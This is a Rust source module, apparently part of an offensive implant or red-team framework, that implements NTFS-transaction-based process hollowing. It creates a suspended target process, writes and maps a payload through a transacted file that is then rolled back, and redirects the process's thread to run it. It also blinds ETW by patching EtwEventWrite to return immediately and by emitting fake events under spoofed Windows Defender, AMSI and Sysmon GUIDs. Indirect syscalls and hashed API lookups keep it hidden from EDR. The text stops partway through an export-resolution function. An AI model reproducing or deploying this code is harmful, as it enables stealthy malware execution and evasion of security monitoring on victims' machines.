//! NTFS Transaction-based Process Hollowing with ETW Blinding.
//!
//! # Overview
//!
//! This module implements a stealthy injection technique that leverages NTFS
//! transactions to make the on-disk payload ephemeral:
//!
//! 1. Create an NTFS transaction via `NtCreateTransaction` (with fallback to
//!    `RtlCreateTransaction` via `kernel32` ordinal).
//! 2. Create a file within the transaction.
//! 3. Create a section backed by the transaction file via `NtCreateSection`.
//! 4. Map the section locally (RW), write the payload, unmap.
//! 5. Create the target process in a suspended state (`CREATE_SUSPENDED`).
//! 6. **ETW blinding**: emit 3–5 fake ETW events with spoofed Windows Defender
//!    and Sysmon provider GUIDs, then patch `EtwEventWrite` in the target
//!    process via remote NtWriteVirtualMemory.
//! 7. Map the section into the target process (PAGE_EXECUTE_READ) or write
//!    via `NtWriteVirtualMemory`.
//! 8. Redirect the primary thread's entry point to the payload.
//! 9. `NtRollbackTransaction` — the file on disk never existed, but the
//!    section mapping in the target process remains valid.
//! 10. Resume the primary thread.
//!
//! # ETW Blinding
//!
//! The ETW blinding phase:
//! - Locates `ntdll.dll` in the target process via `NtQueryVirtualMemory`.
//! - Resolves `EtwEventWrite` in the target's ntdll.
//! - Patches the first byte with `0xC3` (ret) via `NtWriteVirtualMemory`.
//! - Emits fake ETW events with spoofed GUIDs (Windows Defender, Sysmon).
//! - Restores the original byte after the injection is complete.
//!
//! # SSN Resolution
//!
//! All NT API calls go through the existing indirect syscall infrastructure
//! (`syscall!` macro). `NtCreateTransaction` and
//! `NtRollbackTransaction` are resolved at runtime via `get_syscall_id()`.
//! If the SSN cannot be resolved (older Windows builds), falls back to
//! `RtlCreateTransaction` / `RtlRollbackTransaction` resolved by walking
//! `kernel32.dll` exports and matching by ordinal.
//!
//! # Safety
//!
//! All public functions are `unsafe`. They perform raw memory operations and
//! Windows system calls. Must only be called on Windows x86-64.

#![cfg(all(windows, feature = "transacted-hollowing"))]

use crate::injection_engine::{InjectionError, InjectionHandle, InjectionTechnique};
use std::ffi::c_void;

// ── Helpers ──────────────────────────────────────────────────────────────────

/// Dynamically-resolved GetLastError (reads TEB, no IAT entry).
#[cfg(windows)]
unsafe fn get_last_error() -> u32 {
    use std::sync::OnceLock;
    static GET_LAST_ERROR: OnceLock<Option<unsafe extern "system" fn() -> u32>> = OnceLock::new();
    let fn_ptr = GET_LAST_ERROR.get_or_init(|| {
        let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
        let addr = pe_resolve::get_proc_address_by_hash(
            kernel32,
            pe_resolve::hash_str(b"GetLastError\0"),
        )?;
        Some(std::mem::transmute(addr))
    });
    if let Some(func) = fn_ptr {
        func()
    } else {
        // Fallback: read TEB directly (LastErrorValue at TEB+0x68).
        let teb: *mut u8;
        #[cfg(target_arch = "x86_64")]
        {
            std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
        }
        #[cfg(target_arch = "aarch64")]
        {
            std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb);
        }
        std::ptr::read_volatile(teb.add(0x68) as *const u32)
    }
}

// ── Constants ────────────────────────────────────────────────────────────────

/// CREATE_SUSPENDED flag for CreateProcessW.
const CREATE_SUSPENDED: u32 = 0x00000004;

/// SECTION_ALL_ACCESS.
///
/// P2-33: This grants full access to the NT section object used for the
/// transacted injection.  Unlike PROCESS_ALL_ACCESS, this is not a process
/// handle — it is a section handle used for shared memory mapping.  Full
/// access is required because we need to create the section, map views into
/// both the local and remote processes, and write payload data through it.
/// Narrowing this would break the transacted injection flow.
const SECTION_ALL_ACCESS: u64 = 0x000F_001F;

/// SEC_COMMIT.
const SEC_COMMIT: u64 = 0x0800_0000;

/// PAGE_READWRITE.
const PAGE_READWRITE: u64 = 0x04;

/// PAGE_EXECUTE_READ.
const PAGE_EXECUTE_READ: u64 = 0x20;

/// PAGE_EXECUTE_READ (0x20) and PAGE_READWRITE (0x04) are used instead of
/// PAGE_EXECUTE_READWRITE to avoid creating RWX pages that are top EDR IoCs.
/// NtCurrentProcess() pseudo-handle.
const CURRENT_PROCESS: u64 = (-1isize) as u64;

/// SYNCHRONIZE access right.
const SYNCHRONIZE: u32 = 0x00100000;

/// STANDARD_RIGHTS_REQUIRED.
const STANDARD_RIGHTS_REQUIRED: u32 = 0x000F0000;

/// TRANSACTION_ALL_ACCESS.
///
/// P2-33: Full access to the NT transaction object.  Required because we
/// create, commit, and roll back transactions as part of the transacted
/// injection flow.  This operates on a transaction object, not a process
/// handle, so the risk profile is different from PROCESS_ALL_ACCESS.
const TRANSACTION_ALL_ACCESS: u32 = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0x3F;

/// FILE_SUPERSEDE — create or supersede the file.
const FILE_SUPERSEDE: u32 = 0x0000_0000;
/// FILE_SYNCHRONOUS_IO_NONALERT — synchronous I/O, non-alertable.
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x0000_0020;
/// FILE_NON_DIRECTORY_FILE — file must not be a directory.
const FILE_NON_DIRECTORY_FILE: u32 = 0x0000_0040;
/// GENERIC_WRITE access right.
const GENERIC_WRITE: u32 = 0x4000_0000;
/// FILE_ATTRIBUTE_NORMAL — normal file attributes.
const FILE_ATTRIBUTE_NORMAL: u32 = 0x0000_0080;
/// OBJ_CASE_INSENSITIVE — case-insensitive object name comparison.
const OBJ_CASE_INSENSITIVE: u32 = 0x0000_0040;

/// NtCurrentProcess() for handles.
fn current_process() -> usize {
    (-1isize) as usize
}

// ── Spoofed ETW Provider GUIDs ──────────────────────────────────────────────
//
// These are real Windows Defender and Sysmon provider GUIDs used to emit
// fake events that blend into legitimate telemetry noise.

/// Windows Defender threat detection provider.
const DEFENDER_PROVIDER_GUID: [u8; 16] = [
    0x11, 0xCD, 0x39, 0x58, 0x57, 0xBE, 0x49, 0x44, 0xB7, 0x4B, 0x5E, 0x2A, 0xAF, 0x5D, 0x91, 0x9E,
];

/// Microsoft-Antimalware-Scan-Interface provider.
const AMSI_PROVIDER_GUID: [u8; 16] = [
    0xE4, 0x71, 0x51, 0x3C, 0xC7, 0x45, 0x46, 0x4D, 0x9B, 0x7E, 0x71, 0x0C, 0x1D, 0xBE, 0xA2, 0x31,
];

/// Sysmon provider (Microsoft-Windows-Sysmon).
const SYSMON_PROVIDER_GUID: [u8; 16] = [
    0x5A, 0x20, 0x45, 0xAF, 0x64, 0x63, 0x44, 0x4B, 0xB3, 0x20, 0xC6, 0x63, 0x5D, 0x0C, 0x8F, 0x16,
];

/// ETW event descriptor (simplified).
#[repr(C)]
#[derive(Default)]
struct EtwEventDescriptor {
    id: u16,
    version: u8,
    channel: u8,
    level: u8,
    opcode: u8,
    task: u16,
    keyword: u64,
}

/// Fake ETW event data for blinding.
struct FakeEtwEvent {
    provider_guid: &'static [u8; 16],
    descriptor: EtwEventDescriptor,
    user_data: &'static [u8],
}

// ── NTFS Transaction helpers ─────────────────────────────────────────────────

/// Result of creating an NTFS transaction.
struct TransactionHandle {
    handle: usize,
    /// Whether this was created via kernel32 fallback (true) or NtCreateTransaction (false).
    fallback: bool,
}

/// Create an NTFS transaction.
///
/// Tries `NtCreateTransaction` via indirect syscall first. If the SSN cannot
/// be resolved (e.g., older Windows build), falls back to `RtlCreateTransaction`
/// resolved via `kernel32` ordinal.
unsafe fn create_transaction() -> Result<TransactionHandle, String> {
    // ── Attempt 1: NtCreateTransaction via indirect syscall ──────────
    let nt_result = try_nt_create_transaction();
    match nt_result {
        Ok(handle) => {
            tracing::debug!(
                "injection_transacted: NtCreateTransaction succeeded, handle={:#x}",
                handle
            );
            return Ok(TransactionHandle {
                handle,
                fallback: false,
            });
        }
        Err(reason) => {
            tracing::debug!(
                "injection_transacted: NtCreateTransaction failed ({}), trying kernel32 fallback",
                reason
            );
        }
    }

    // ── Attempt 2: RtlCreateTransaction via kernel32 ─────────────────
    let fallback_result = try_rtl_create_transaction();
    match fallback_result {
        Ok(handle) => {
            tracing::debug!(
                "injection_transacted: RtlCreateTransaction fallback succeeded, handle={:#x}",
                handle
            );
            Ok(TransactionHandle {
                handle,
                fallback: true,
            })
        }
        Err(reason) => Err(format!(
            "both NtCreateTransaction and RtlCreateTransaction failed: {}",
            reason
        )),
    }
}

/// Try NtCreateTransaction via the indirect syscall infrastructure.
unsafe fn try_nt_create_transaction() -> Result<usize, String> {
    use crate::syscalls::do_syscall;
    use crate::syscalls::get_syscall_id;

    let target = get_syscall_id("NtCreateTransaction").map_err(|e| format!("{}", e))?;

    // NtCreateTransaction(
    //   OUT PHANDLE TransactionHandle,
    //   IN ACCESS_MASK DesiredAccess,
    //   IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    //   IN PLARGE_INTEGER Timeout OPTIONAL,
    //   IN ULONG Unknown OPTIONAL,           // reserved, pass 0
    //   IN PUNICODE_STRING Description OPTIONAL,
    //   IN LPGUID Uow OPTIONAL               // unit of work GUID
    // )
    let mut tx_handle: usize = 0;
    let status = do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            &mut tx_handle as *mut _ as u64, // TransactionHandle
            TRANSACTION_ALL_ACCESS as u64,   // DesiredAccess
            0u64,                            // ObjectAttributes = NULL
            0u64,                            // Timeout = NULL
            0u64,                            // Unknown = 0
            0u64,                            // Description = NULL
            0u64,                            // Uow = NULL
        ],
    );

    if status < 0 {
        return Err(format!("NtCreateTransaction returned {:#x}", status as u32));
    }
    if tx_handle == 0 {
        return Err("NtCreateTransaction returned null handle".to_string());
    }
    Ok(tx_handle)
}

/// Try RtlCreateTransaction by resolving it from kernel32/ntdll exports.
///
/// Falls back to walking ntdll's export table for the function, or finding
/// `CreateTransaction` in kernel32 (which is a thin wrapper around the ntdll
/// implementation).
unsafe fn try_rtl_create_transaction() -> Result<usize, String> {
    // Try to find RtlCreateTransaction in ntdll first.
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
        .ok_or("cannot resolve ntdll base")?;

    // Hash for "RtlCreateTransaction" — compute at compile time.
    let rtl_hash = pe_resolve::hash_str(b"RtlCreateTransaction\0");
    if let Some(addr) = pe_resolve::get_proc_address_by_hash(ntdll, rtl_hash) {
        let func: extern "system" fn(
            *mut usize,  // TransactionHandle
            u32,         // DesiredAccess
            *mut c_void, // ObjectAttributes
            *mut c_void, // Timeout
            u32,         // Reserved
            *mut c_void, // Description
            *mut c_void, // Uow
        ) -> i32 = std::mem::transmute(addr);

        let mut tx_handle: usize = 0;
        let status = func(
            &mut tx_handle,
            TRANSACTION_ALL_ACCESS,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        );

        if status >= 0 && tx_handle != 0 {
            return Ok(tx_handle);
        }
        return Err(format!(
            "RtlCreateTransaction returned status={:#x}",
            status as u32
        ));
    }

    // Last resort: CreateTransaction from kernel32.
    let k32_hash = pe_resolve::hash_str(b"kernel32.dll\0");
    let k32 =
        pe_resolve::get_module_handle_by_hash(k32_hash).ok_or("cannot resolve kernel32 base")?;

    let ct_hash = pe_resolve::hash_str(b"CreateTransaction\0");
    if let Some(addr) = pe_resolve::get_proc_address_by_hash(k32, ct_hash) {
        let func: extern "system" fn(
            *mut usize,  // lpTransactionAttributes
            *mut c_void, // UOW
            u32,         // CreateOptions
            u32,         // IsolationLevel
            u32,         // IsolationFlags
            u32,         // Timeout (infinite = 0)
            *mut c_void, // Description
        ) -> i32 = std::mem::transmute(addr);

        let mut tx_handle: usize = 0;
        let ret = func(
            &mut tx_handle,
            std::ptr::null_mut(),
            0,
            0,
            0,
            0,
            std::ptr::null_mut(),
        );

        // kernel32 CreateTransaction returns a BOOL (non-zero = success).
        if ret != 0 && tx_handle != 0 {
            return Ok(tx_handle);
        }
        return Err(format!(
            "kernel32 CreateTransaction returned {} (handle={:#x})",
            ret, tx_handle
        ));
    }

    Err(
        "could not resolve NtCreateTransaction, RtlCreateTransaction, or CreateTransaction"
            .to_string(),
    )
}

/// Roll back an NTFS transaction.
///
/// Tries `NtRollbackTransaction` via indirect syscall first, then falls back
/// to `RtlRollbackTransaction` / `RollbackTransaction` from kernel32.
unsafe fn rollback_transaction(tx: &TransactionHandle) -> Result<(), String> {
    if !tx.fallback {
        // Try NtRollbackTransaction via indirect syscall.
        if let Ok(target) = crate::syscalls::get_syscall_id("NtRollbackTransaction") {
            let status = crate::syscalls::do_syscall(
                target.ssn,
                target.gadget_addr,
                &[
                    tx.handle as u64, // TransactionHandle
                    1u64,             // Wait = TRUE
                ],
            );
            if status >= 0 {
                tracing::debug!("injection_transacted: NtRollbackTransaction succeeded");
                return Ok(());
            }
            tracing::debug!(
                "injection_transacted: NtRollbackTransaction failed ({:#x}), trying fallback",
                status as u32
            );
        }
    }

    // Fallback: RtlRollbackTransaction or RollbackTransaction from ntdll/kernel32.
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
    if let Some(ntdll_base) = ntdll {
        let hash = pe_resolve::hash_str(b"RtlRollbackTransaction\0");
        if let Some(addr) = pe_resolve::get_proc_address_by_hash(ntdll_base, hash) {
            let func: extern "system" fn(usize, i32) -> i32 = std::mem::transmute(addr);
            let status = func(tx.handle, 1);
            if status >= 0 {
                tracing::debug!("injection_transacted: RtlRollbackTransaction succeeded");
                return Ok(());
            }
        }
    }

    // Last resort: RollbackTransaction from kernel32.
    let k32_hash = pe_resolve::hash_str(b"kernel32.dll\0");
    if let Some(k32) = pe_resolve::get_module_handle_by_hash(k32_hash) {
        let hash = pe_resolve::hash_str(b"RollbackTransaction\0");
        if let Some(addr) = pe_resolve::get_proc_address_by_hash(k32, hash) {
            let func: extern "system" fn(usize) -> i32 = std::mem::transmute(addr);
            let ret = func(tx.handle);
            if ret != 0 {
                tracing::debug!("injection_transacted: kernel32 RollbackTransaction succeeded");
                return Ok(());
            }
        }
    }

    Err("all rollback methods failed".to_string())
}

/// Close a transaction handle.
unsafe fn close_handle(handle: usize) {
    let _ = crate::syscall!("NtClose", handle as u64);
}

/// Set the calling thread's current KTM transaction context.
///
/// When a transaction is set as the thread's current transaction, subsequent
/// file I/O on this thread (e.g. `NtCreateFile`, `NtWriteFile`) is
/// automatically enlisted in that transaction.  This is the correct NT-level
/// mechanism for binding a file operation to a transaction — **not** placing
/// the transaction handle in `OBJECT_ATTRIBUTES.RootDirectory` (which is a
/// directory handle field and causes `NtCreateFile` to fail with
/// `STATUS_OBJECT_TYPE_MISMATCH`).
///
/// Pass `0` (null handle) to clear the thread's transaction context.
///
/// Resolves `RtlSetCurrentTransaction` from ntdll's export table.  Falls
/// back to `NtSetInformationThread` with `ThreadTransactionContext` info
/// class if the ntdll export is unavailable.
pub(crate) unsafe fn set_current_transaction(tx_handle: usize) -> Result<(), String> {
    // ── Attempt 1: RtlSetCurrentTransaction from ntdll ───────────────
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
    if let Some(ntdll_base) = ntdll {
        let hash = pe_resolve::hash_str(b"RtlSetCurrentTransaction\0");
        if let Some(addr) = pe_resolve::get_proc_address_by_hash(ntdll_base, hash) {
            let func: extern "system" fn(usize) -> i32 = std::mem::transmute(addr);
            let status = func(tx_handle);
            if status >= 0 {
                return Ok(());
            }
            return Err(format!(
                "RtlSetCurrentTransaction({:#x}) returned {:#x}",
                tx_handle, status as u32
            ));
        }
    }

    // ── Attempt 2: NtSetInformationThread(ThreadTransactionContext) ───
    // Info class 40 = ThreadTransactionContext on Windows 10+.
    // The input buffer must be a POINTER to a HANDLE value, not the handle
    // value itself.  We store the handle in a local and pass its address.
    if let Ok(target) = crate::syscalls::get_syscall_id("NtSetInformationThread") {
        let tx_handle_local = tx_handle as u64;
        let status = crate::syscalls::do_syscall(
            target.ssn,
            target.gadget_addr,
            &[
                0xFFFFFFFFFFFFFFFEu64,                 // NtCurrentThread() pseudo-handle
                40u64,                                 // ThreadTransactionContext
                &tx_handle_local as *const u64 as u64, // Pointer to HANDLE value
                8u64,                                  // Length of HANDLE
            ],
        );
        if status >= 0 {
            return Ok(());
        }
        return Err(format!(
            "NtSetInformationThread(ThreadTransactionContext) returned {:#x}",
            status as u32
        ));
    }

    Err("cannot resolve RtlSetCurrentTransaction or NtSetInformationThread".to_string())
}

// ── Page alignment helper ────────────────────────────────────────────────────

/// Align `size` up to the next page boundary using the runtime page size.
///
/// Delegates to [`crate::page_size::page_align`] which queries
/// `GetSystemInfo` on first call and caches the result.
fn page_align(size: usize) -> usize {
    crate::page_size::page_align(size)
}

// ── Remote ETW patching ──────────────────────────────────────────────────────

/// Result of remote ETW blinding operations.
struct EtwBlindingContext {
    /// Address of EtwEventWrite in the target's ntdll.
    etw_write_addr: usize,
    /// Original first byte that was saved before patching.
    original_byte: u8,
    /// Target process handle.
    process_handle: usize,
    /// Whether the patch was actually applied.
    patched: bool,
}

/// Locate ntdll.dll in the target process by scanning its virtual memory.
///
/// Returns the base address of ntdll in the target process.
unsafe fn find_remote_ntdll(process_handle: usize) -> Result<usize, String> {
    // Ntdll is loaded at the same base address in every process (ASLR is
    // per-boot, not per-process).  We can read it from our own PEB.
    let local_ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
        .ok_or("cannot resolve local ntdll")?;

    // Verify it's actually mapped in the target at the same address by
    // reading the MZ header from the target at the expected address.
    let mut buf = [0u8; 2];
    let mut bytes_read: usize = 0;
    let read_status = crate::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        local_ntdll as u64,
        buf.as_mut_ptr() as u64,
        2u64,
        &mut bytes_read as *mut _ as u64,
    );

    if read_status.is_ok() && buf[0] == b'M' && buf[1] == b'Z' {
        return Ok(local_ntdll);
    }

    // Fallback: scan the target's virtual memory for an image mapping whose
    // export directory name is "ntdll.dll".  This is needed when the target
    // process has ntdll at a different base (unusual but possible, e.g.
    // KnownDlls bypass or custom loader).  HIGH-012 fix.
    scan_remote_for_ntdll(process_handle)
}

/// Walk the target process's virtual address space looking for ntdll.dll.
///
/// For each committed image-backed region, read the PE export directory
/// name and compare it against "ntdll.dll".
unsafe fn scan_remote_for_ntdll(process_handle: usize) -> Result<usize, String> {
    use core::mem::MaybeUninit;

    // Resolve NtQueryVirtualMemory from local ntdll.
    let local_ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
        .ok_or("cannot resolve local ntdll for NtQueryVirtualMemory")?;
    let ntqvm_addr = pe_resolve::get_proc_address_by_hash(
        local_ntdll,
        pe_resolve::hash_str(b"NtQueryVirtualMemory\0"),
    )
    .ok_or("cannot resolve NtQueryVirtualMemory")?;

    if ntqvm_addr % 8 != 0 {
        return Err("NtQueryVirtualMemory address not aligned".to_string());
    }

    let nt_query_vm: extern "system" fn(
        process_handle: usize,
        base_address: *mut core::ffi::c_void,
        memory_information_class: u32,
        memory_information: *mut core::ffi::c_void,
        memory_information_length: usize,
        return_length: *mut usize,
    ) -> i32 = core::mem::transmute(ntqvm_addr);

    // MEMORY_BASIC_INFORMATION (subset).
    #[repr(C)]
    struct Mbi {
        base_address: usize,
        allocation_base: usize,
        allocation_protect: u32,
        region_size: usize,
        state: u32,
        protect: u32,
        type_: u32,
    }

    const MEM_COMMIT: u32 = 0x1000;
    const MEM_IMAGE: u32 = 0x1000000;

    let mut addr: usize = 0;

    loop {
        let mut mbi: Mbi = core::mem::zeroed();
        let mut ret_len: usize = 0;
        let status = nt_query_vm(
            process_handle,
            addr as *mut core::ffi::c_void,
            0, // MemoryBasicInformation
            &mut mbi as *mut _ as *mut core::ffi::c_void,
            core::mem::size_of::<Mbi>(),
            &mut ret_len,
        );
        if status != 0 {
            break;
        }
        if mbi.region_size == 0 {
            break;
        }

        let next_addr = match mbi.base_address.checked_add(mbi.region_size) {
            Some(a) => a,
            None => break,
        };

        // Only scan committed, image-backed regions.
        if mbi.state == MEM_COMMIT && mbi.type_ == MEM_IMAGE {
            // Read the first page to check MZ header + PE export dir name.
            let mut header = [0u8; 0x1000];
            let mut bytes_read: usize = 0;
            let rs = crate::syscall!(
                "NtReadVirtualMemory",
                process_handle as u64,
                mbi.base_address as u64,
                header.as_mut_ptr() as u64,
                0x1000u64,
                &mut bytes_read as *mut _ as u64,
            );
            if rs.as_ref().map_or(false, |s| *s >= 0) && bytes_read >= 0x200 {
                if header[0] == b'M' && header[1] == b'Z' {
                    // Check if this image's export directory name is ntdll.dll.
                    if let Some(true) = check_export_dir_name_ntdll(&header) {
                        tracing::info!(
                            "injection_transacted: found ntdll in target at {:#x} via memory scan",
                            mbi.base_address
                        );
                        return Ok(mbi.base_address);
                    }
                }
            }
        }

        addr = next_addr;
    }

    Err("could not locate ntdll in target process via memory scan".to_string())
}

/// Check whether the PE header in `header_buf` (at least 0x200 bytes)
/// has an export directory whose name is "ntdll.dll" (case-insensitive).
fn check_export_dir_name_ntdll(header: &[u8]) -> Option<bool> {
    if header.len() < 0x200 {
        return None;
    }

    // Read e_lfanew (offset 0x3C).
    let e_lfanew = u32::from_le_bytes(header[0x3C..0x40].try_into().ok()?) as usize;
    if e_lfanew == 0 || e_lfanew + 0x78 > header.len() {
        return None;
    }

    // Optional header offset = e_lfanew + 0x18
    let opt_off = e_lfanew + 0x18;

    // Data directory offset: export directory is the first entry (index 0).
    // In PE32+ (64-bit), data directories start at offset 0x70 from the
    // start of the optional header.
    let dd_off = opt_off + 0x70;
    if dd_off + 8 > header.len() {
        return None;
    }

    let export_rva = u32::from_le_bytes(header[dd_off..dd_off + 4].try_into().ok()?) as usize;
    let export_size = u32::from_le_bytes(header[dd_off + 4..dd_off + 8].try_into().ok()?) as usize;

    if export_rva == 0 || export_size == 0 {
        return Some(false); // No export directory.
    }

    // The export directory starts with characteristics (4), timestamp (4),
    // version (4+4), name RVA (4).  Name RVA is at offset +12.
    let name_rva_off = export_rva + 12;
    if name_rva_off + 4 > header.len() {
        return None;
    }

    let name_rva =
        u32::from_le_bytes(header[name_rva_off..name_rva_off + 4].try_into().ok()?) as usize;
    if name_rva == 0 || name_rva_off >= header.len() {
        return None;
    }

    // The name is a null-terminated ASCII string at `name_rva`.
    let name_end = (name_rva + 12).min(header.len());
    let name_bytes = &header[name_rva..name_end];

    // Find null terminator.
    let name_str = match name_bytes.iter().position(|&b| b == 0) {
        Some(pos) => &name_bytes[..pos],
        None => name_bytes,
    };

    // Compare case-insensitively with "ntdll.dll".
    const NTDLL_NAME: &[u8] = b"ntdll.dll";
    if name_str.len() != NTDLL_NAME.len() {
        return Some(false);
    }

    let matches = name_str
        .iter()
        .zip(NTDLL_NAME.iter())
        .all(|(a, b)| a.to_ascii_lowercase() == *b);

    Some(matches)
}

/// Maximum recursion depth for forwarded-export resolution across process
/// boundaries.  Forwarder chains deeper than this are treated as circular
/// or malicious and resolution returns an error instead of overflowing
/// the stack.
const MAX_REMOTE_FORWARDER_DEPTH: u32 = 8;

/// Resolve a remote module by its DLL name (ASCII, case-insensitive).
///
/// System DLLs are loaded at the same base address in every process on a
/// given boot (boot-time ASLR), so we resolve the module locally and then
/// verify that the mapping exists in the remote process.
unsafe fn resolve_remote_module_by_name(
    process_handle: usize,
    module_name: &[u8],
) -> Result<usize, String> {
    // Convert ASCII module name to UTF-16 for hashing (lowercased).
    let mut wide = [0u16; 260];
    if module_name.len() >= 260 {
        return Err(format!(
            "forwarder module name too long: {}",
            module_name.len()
        ));
    }
    for (i, &b) in module_name.iter().enumerate() {
        wide[i] = b.to_ascii_lowercase() as u16;
    }

    // Try without extension first (forwarder strings are usually extensionless
    // like "NTDLL"), then with ".dll".
    let hash_bare = pe_resolve::hash_wstr(&wide[..module_name.len()]);
    let module_base = pe_resolve::get_module_handle_by_hash(hash_bare).or_else(|| {
        if module_name.len() + 4 >= 260 {
            return None;
        }
        wide[module_name.len()] = b'.' as u16;
        wide[module_name.len() + 1] = b'd' as u16;
        wide[module_name.len() + 2] = b'l' as u16;
        wide[module_name.len() + 3] = b'l' as u16;
        let hash_ext = pe_resolve::hash_wstr(&wide[..module_name.len() + 4]);
        pe_resolve::get_module_handle_by_hash(hash_ext)
    });

    let base = module_base.ok_or_else(|| {
        format!(
            "cannot resolve local module '{}'",
            String::from_utf8_lossy(module_name)
        )
    })?;

    // Verify the module is mapped in the remote process at the same address
    // by reading the MZ header.
    let mut buf = [0u8; 2];
    let mut bytes_read: usize = 0;
    let read_status = crate::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        base as u64,
        buf.as_mut_ptr() as u64,
        2u64,
        &mut bytes_read as *mut _ as u64,
    );

    if read_status.is_ok() && buf[0] == b'M' && buf[1] == b'Z' {
        Ok(base)
    } else {
        Err(format!(
            "module '{}' found locally at {:#x} but not mapped in remote process",
            String::from_utf8_lossy(module_name),
            base
        ))
    }
}

/// Resolve a forwarded export in a remote process.
///
/// When an export's RVA falls within the export directory itself, it points
/// to a null-terminated ASCII forwarder string of the form "MODULE.Function"
/// or "MODULE.#Ordinal".  This function reads the forwarder string from the
/// remote process, parses it, resolves the target module, and recursively
/// calls `resolve_remote_export` for the forwarded function.
unsafe fn resolve_forwarded_remote_export(
    process_handle: usize,
    _source_module_base: usize,
    forwarder_rva: usize,
    _export_dir_rva: usize,
    _export_dir_size: usize,
    depth: u32,
) -> Result<usize, String> {
    if depth >= MAX_REMOTE_FORWARDER_DEPTH {
        return Err("forwarder chain too deep (possible cycle)".to_string());
    }

    // Read the forwarder string from the remote process.
    const MAX_FORWARDER_STR_LEN: usize = 512;
    let forwarder_addr = _source_module_base + forwarder_rva;
    let mut forwarder_buf = [0u8; MAX_FORWARDER_STR_LEN];
    let mut bytes_read: usize = 0;
    let status = crate::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        forwarder_addr as u64,
        forwarder_buf.as_mut_ptr() as u64,
        MAX_FORWARDER_STR_LEN as u64,
        &mut bytes_read as *mut _ as u64,
    );
    if status.as_ref().map_or(true, |s| *s < 0) {
        return Err("failed to read forwarder string from target".to_string());
    }

    // Find null terminator.
    let forwarder_len = forwarder_buf
        .iter()
        .position(|&b| b == 0)
        .unwrap_or(MAX_FORWARDER_STR_LEN);
    if forwarder_len == 0 {
        return Err("empty forwarder string".to_string());
    }
    let forwarder = &forwarder_buf[..forwarder_len];

    // Split on '.' to get "MODULE" and "Function".
    let dot_pos = forwarder.iter().position(|&b| b == b'.').ok_or_else(|| {
        format!(
            "forwarder string has no '.': {:?}",
            String::from_utf8_lossy(forwarder)
        )
    })?;

    if dot_pos == 0 || dot_pos + 1 >= forwarder_len {
        return Err(format!(
            "malformed forwarder string: {:?}",
            String::from_utf8_lossy(forwarder)
        ));
    }

    let module_name = &forwarder[..dot_pos];
    let function_part = &forwarder[dot_pos + 1..];

    // Resolve the target module in the remote process.
    let target_module_base = resolve_remote_module_by_name(process_handle, module_name)?;

    // Handle ordinal forwarders (e.g. "NTDLL.#42").
    if function_part.starts_with(b"#") {
        let ordinal_str = &function_part[1..];
        let ordinal: usize = core::str::from_utf8(ordinal_str)
            .map_err(|e| format!("non-UTF8 ordinal in forwarder: {}", e))?
            .parse()
            .map_err(|e| format!("invalid ordinal in forwarder: {}", e))?;

        // To resolve by ordinal we need to read the export directory of the
        // target module and index into the function table using
        // (ordinal - Base).
        return resolve_remote_export_by_ordinal(process_handle, target_module_base, ordinal);
    }

    // Name-based forwarder: resolve the function export in the target module.
    resolve_remote_export(process_handle, target_module_base, function_part)
}

/// Resolve an export by ordinal in a remote module.
///
/// Reads the PE export directory from the target process, computes the
/// function table index as `ordinal - Base`, and returns the resolved address.
/// Handles forwarded exports recursively.
unsafe fn resolve_remote_export_by_ordinal(
    process_handle: usize,
    module_base: usize,
    ordinal: usize,
) -> Result<usize, String> {
    // Read DOS header.
    let mut dos_header = [0u8; 0x40];
    let mut bytes_read: usize = 0;
    let status = crate::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        module_base as u64,
        dos_header.as_mut_ptr() as u64,
        0x40u64,
        &mut bytes_read as *mut _ as u64,
    );
    if status.as_ref().map_or(true, |s| *s < 0) {
        return Err("failed to read DOS header for ordinal resolve".to_string());
    }
    if dos_header[0] != b'M' || dos_header[1] != b'Z' {
        return Err("invalid DOS signature for ordinal resolve".to_string());
    }

    let e_lfanew = u32::from_le_bytes([
        dos_header[0x3c],
        dos_header[0x3d],
        dos_header[0x3e],
        dos_header[0x3f],
    ]) as usize;

    // Read PE header + optional header.
    let mut pe_buf = [0u8; 0x100];
    let status = crate::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        (module_base + e_lfanew) as u64,
        pe_buf.as_mut_ptr() as u64,
        0x100u64,
        &mut bytes_read as *mut _ as u64,
    );
    if status.as_ref().map_or(true, |s| *s < 0) {
        return Err("failed to read PE header for ordinal resolve".to_string());
    }

    // Verify PE signature.
    if pe_buf[0] != b'P' || pe_buf[1] != b'E' || pe_buf[2] != 0 || pe_buf[3] != 0 {
        return Err("invalid PE signature for ordinal resolve".to_string());
    }

    let optional_header_offset = 24;
    let export_dir_rva_offset = optional_header_offset + 112;

    let export_dir_rva = u32::from_le_bytes([
        pe_buf[export_dir_rva_offset],
        pe_buf[export_dir_rva_offset + 1],
        pe_buf[export_dir_rva_offset + 2],
        pe_buf[export_dir_rva_offset + 3],
    ]);
    let export_dir_size = u32::from_le_bytes([
        pe_buf[export_dir_rva_offset + 4],
        pe_buf[export_dir_rva_offset + 5],
        pe_buf[export_dir_rva_offset + 6],
        pe_buf[export_dir_rva_offset + 7],
    ]);

    if export_dir_rva == 0 {
        return Err("module has no export directory for ordinal resolve".to_string());
    }

    // Read export directory.
    let export_dir_addr = module_base + export_dir_rva as usize;
    let mut export_dir = [0u8; 40];
    let status = crate::syscall!(
        "NtReadVirtualMemory",
        process_handle as u64,
        export_dir_addr as u64,
